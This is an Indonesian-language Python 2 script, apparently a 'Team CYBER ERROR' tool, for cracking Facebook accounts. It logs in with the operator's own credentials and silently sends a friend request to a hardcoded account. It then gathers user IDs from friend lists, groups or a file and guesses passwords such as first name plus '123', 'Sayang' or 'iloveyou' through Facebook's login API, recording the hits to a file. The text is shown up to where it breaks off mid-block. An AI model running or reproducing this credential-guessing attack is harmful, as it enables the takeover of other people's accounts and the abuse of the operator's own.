							        #!/usr/bin/python2
								# coding=utf-8
								
								
								import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
								from multiprocessing.pool import ThreadPool
								from requests.exceptions import ConnectionError
								from mechanize import Browser
								
								
								reload(sys)
								sys.setdefaultencoding('utf8')
								br = mechanize.Browser()
								br.set_handle_robots(False)
								br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
								br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
								
								
								def keluar():
								print "\033[1;96m[!] \x1b[1;91mExit"
								os.sys.exit()
								
								
								def acak(x):
								w = 'mhkbpcP'
								d = ''
								for i in x:
								d += '!'+w[random.randint(0,len(w)-1)]+i
								return cetak(d)
								
								
								def cetak(x):
								w = 'mhkbpcP'
								for i in w:
								j = w.index(i)
								x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
								x += '\033[0m'
								x = x.replace('!0','\033[0m')
								sys.stdout.write(x+'\n')
								
								
								def jalan(z):
								for e in z + '\n':
								sys.stdout.write(e)
								sys.stdout.flush()
								time.sleep(0.05)
								
								
								logo = """   \x1b[1;91m█████████
								█▄█████▄█      \x1b[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●            █ ▼▼▼▼▼  _ --_--╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
								\033[1;97m█  \033[1;97m_-_-- -_ --__ ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗             █ ▲▲▲▲▲-  - _ --═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ PHB
								█████████      \x1b[1;91m«°°°°°°°°°°✧°°°°°°°°°°»
								██ █ \x1b[1;91m▇▇▇▇▇▇          \033[1;97m╭∩╮(^_^)╭∩╮ \x1b[1;95m[●]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[●]\n ✫╬─ \x1b[1;92mTeam CYBER ERROR   \x1b[1;91m: \x1b[1;93mM.R.0K3T_M.R.1F4N_M.R.D1MZ_M.R.1Z4L_M.R.R1F4                 \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92msorry    \x1b[1;92m \x1b[1;91m: \x1b[1;96mwe are not hackers   \x1b[1;95m─╬✫\n ✫╬─  \x1b[1;91mbuat lu \x1b[1;93m: \x1b[1;91mmembuat tidak semudah memakai    \x1b[1;95m─╬✫\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
								"""   \033[1;97m▇▇▇▇▇▇
								
								def tik():
								titik = ['.   ','..  ','... ']
								for o in titik:
								print("\r\033[1;96m[●] \x1b[1;93mSedang masuk BANGSAT..  \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
								
								
								back = 0
								threads = []
								berhasil = []
								cekpoint = []
								oks = []
								id = []
								listgrup = []
								vulnot = "\033[31mNot Vuln"
								vuln = "\033[32mVuln"
								
								def siapa():
								os.system('clear')
								nama = raw_input("\033[1;97mWho The Name Of You...Input with the original name  ? \033[1;91m: \033[1;92m")
								if nama =="":
								print"\033[1;96m[!] \033[1;91mIsian ka bener"
								time.sleep(1)
								siapa()
								else:
								os.system('clear')
								jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;92mThank you Have Been Using This Tools ..tong di salah gunakeun..[•]subscribe chanel abang gua..") 
								time.sleep(1)
								loginSC()
								
								
								def loginSC():
								os.system('clear')
								jalan("\033[1;91mSilahkan login SC nya dulu....jangan di salah guanakan....jangan di jual belikan ya BANGSAT If the username and fasswordnya don't know please ask the maker on the script  ..! \n")
								os.system('xdg-open https://wa.me/6283826516546 ')
								username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
								password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
								if username =="pecinta" and password =="ulama":
								print"\033[1;96m[✓] \033[1;92mLogin success.."
								time.sleep(1)
								login()
								else:
								print"\033[1;96m[!] \033[1;91mSalah!!"
								time.sleep(1)
								LoginSC()
								
								def login():
								os.system('clear')
								try:
								toket = open('login.txt','r')
								menu() 
								except (KeyError,IOError):
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								print('\033[1;96mjika loginya berhasil \x1b[1;93mnanti akan di arahkan ke youtube \x1b[1;96mdan lo harus SUBSCRIBE dulu' )
								print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK SIA \x1b[1;96m[☆]' )
								id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
								pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
								tik()
								try:
								br.open('https://m.facebook.com')
								except mechanize.URLError:
								print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
								keluar()
								br._factory.is_html = True
								br.select_form(nr=0)
								br.form['email'] = id
								br.form['pass'] = pwd
								br.submit()
								url = br.geturl()
								if 'save-device' in url:
								try:
								sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
								data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
								x=hashlib.new("md5")
								x.update(sig)
								a=x.hexdigest()
								data.update({'sig':a})
								url = "https://api.facebook.com/restserver.php"
								r=requests.get(url,params=data)
								z=json.loads(r.text)
								unikers = open("login.txt", 'w')
								unikers.write(z['access_token'])
								unikers.close()
								print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil..'
								requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
								os.system('xdg-open https://youtu.be/eC74EEpZ3hI ')
								menu()
								except requests.exceptions.ConnectionError:
								print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
								keluar()
								if 'checkpoint' in url:
								print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								else:
								print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
								os.system('rm -rf login.txt')
								time.sleep(1)
								login()
								
								
								def menu():
								os.system('clear')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								os.system('clear')
								print"\033[1;96m[!] \x1b[1;91mToken invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								try:
								otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
								a = json.loads(otw.text)
								nama = a['name']
								id = a['id']
								except KeyError:
								os.system('clear')
								print"\033[1;96m[!] \033[1;91mToken invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								login()
								except requests.exceptions.ConnectionError:
								print"\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
								keluar()
								os.system("clear")
								print logo
								print 42*"\033[1;96m="
								print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
								print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
								print 42*"\033[1;96m="
								print "\x1b[1;97m1.\x1b[1;93m Hack Acount Facebook"
								print "\x1b[1;97m2.\x1b[1;93m See The List Of Groups             "
								print "\x1b[1;97m3.\x1b[1;93m Account Information              "
								print "\x1b[1;97m4.\x1b[1;93m Yahoo clone               "
								print "\n\x1b[1;91m0.\x1b[1;91m keluar sayang😘            "
								pilih()
								
								
								def pilih():
								unikers = raw_input("\n\033[1;97m╰──────>♡[PHB]●> \033[1;97m")
								if unikers =="":
								print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
								pilih()
								elif unikers =="1":
								super()
								elif unikers =="2":
								grupsaya()
								elif unikers =="3":
								informasi()
								elif unikers =="4":
								yahoo()
								elif unikers =="0":
								os.system('clear')
								jalan('Menghapus token')
								os.system('rm -rf login.txt')
								keluar()
								else:
								print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
								pilih()
								
								
								def super():
								global toket
								os.system('clear')
								try:
								toket=open('login.txt','r').read()
								except IOError:
								print"\033[1;96m[!] \x1b[1;91mToken invalid"
								os.system('rm -rf login.txt')
								time.sleep(1)
								keluar()
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								print "\x1b[1;97m1.\x1b[1;93m Crack From Friends List"
								print "\x1b[1;97m2.\x1b[1;93m Crack From A Friend"
								print "\x1b[1;97m3.\x1b[1;93m Crack  From Group"
								print "\x1b[1;97m4.\x1b[1;93m Crack  From file"
								print "\n\x1b[1;91m0.\x1b[1;91mKeluar sayang"
								pilih_super()
								
								def pilih_super():
								peak = raw_input("\n\033[1;97m╰──────>♡[PHB]●>\033[1;97m")
								if peak =="":
								print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
								pilih_super()
								elif peak =="1":
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								jalan('\033[1;96m[✺] \033[1;93mTake Id \033[1;97m...')
								r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
								z = json.loads(r.text)
								for s in z['data']:
								id.append(s['id'])
								elif peak =="2":
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								idt = raw_input("\033[1;96m[+] \033[1;93mInput Your Friend's Id. \033[1;91m: \033[1;97m")
								try:
								jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
								op = json.loads(jok.text)
								print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName friends\033[1;91m :\033[1;97m "+op["name"]
								except KeyError:
								print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								super()
								jalan('\033[1;96m[✺] \033[1;93mtake ID  \033[1;97m...')
								r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
								z = json.loads(r.text)
								for i in z['data']:
								id.append(i['id'])
								elif peak =="3":
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								idg=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
								try:
								r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
								asw=json.loads(r.text)
								print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
								except KeyError:
								print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
								raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
								super()
								jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
								re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
								s=json.loads(re.text)
								for p in s['data']:
								id.append(p['id'])
								elif peak =="4":
								os.system('clear')
								print logo
								print 42*"\033[1;96m="
								try:
								idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
								for line in open(idlist,'r').readlines():
								id.append(line.strip())
								except IOError:
								print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
								raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
								super()
								elif peak =="0":
								menu()
								else:
								print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
								pilih_super()
								
								print "\033[1;96m[+] \033[1;93mthe number of ID \033[1;91m: \033[1;97m"+str(len(id))
								titik = ['.   ','..  ','... ']
								for o in titik:
								print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mSabar jomblo \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
								print
								print('\x1b[1;96m[!] \x1b[1;93mjika sdh mnang akunya beri si pembuat sc')
								print 42*"\033[1;96m="
								
								
								def main(arg):
								global cekpoint,oks
								user = arg
								try:
								os.mkdir('out')
								except OSError:
								pass
								try:
								a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
								b = json.loads(a.text)
								pass1 = b['first_name']+'123'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
								oks.append(user+pass1)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass1+"\n")
								cek.close()
								cekpoint.append(user+pass1)
								else:
								pass2 =b['first_name']+'12345'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
								oks.append(user+pass2)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass2+"\n")
								cek.close()
								cekpoint.append(user+pass2)
								else:
								pass3 = 'Bangsat'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
								oks.append(user+pass3)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass3+"\n")
								cek.close()
								cekpoint.append(user+pass3)
								else:
								pass4 = 'Sayang'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
								oks.append(user+pass4)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass4+"\n")
								cek.close()
								cekpoint.append(user+pass4)
								else:
								pass5 = 'Kontol'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
								oks.append(user+pass5)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass5+"\n")
								cek.close()
								cekpoint.append(user+pass5)
								else:
								pass6 = 'Bagong'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
								oks.append(user+pass6)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass6+"\n")
								cek.close()
								cekpoint.append(user+pass6)
								else:
							    pass7 = 'Anjing'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass7 + '\n'
								oks.append(user+pass7)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass7 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass7+"\n")
								cek.close()
								cekpoint.append(user+pass7)
								else:
								pass8 = 'Gaming'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass8 + '\n'
								oks.append(user+pass8)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass8 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass8+"\n")
								cek.close()
								cekpoint.append(user+pass8)
								else:
								pass9 = 'Monyet'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass9 + '\n'
								oks.append(user+pass9)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass9 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass9+"\n")
								cek.close()
								cekpoint.append(user+pass9)
								else:
								pass10 = 'rebahan'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass10 + '\n'
								oks.append(user+pass10)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass10 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass10+"\n")
								cek.close()
								cekpoint.append(user+pass10)
								else:
								pass11 = 'Jomblo'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass11 + '\n'
								oks.append(user+pass11)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass11 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass11+"\n")
								cek.close()
								cekpoint.append(user+pass11)
								else:
								pass12 = 'Password'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass12 + '\n'
								oks.append(user+pass12)
								else:
								if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass12 + '\n'
								cek = open("out/super_cp.txt", "a")
								cek.write("ID:" +user+ " Pw:" +pass12+"\n")
								cek.close()
								cekpoint.append(user+pass12)
								else:
								pass13 = 'iloveyou'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
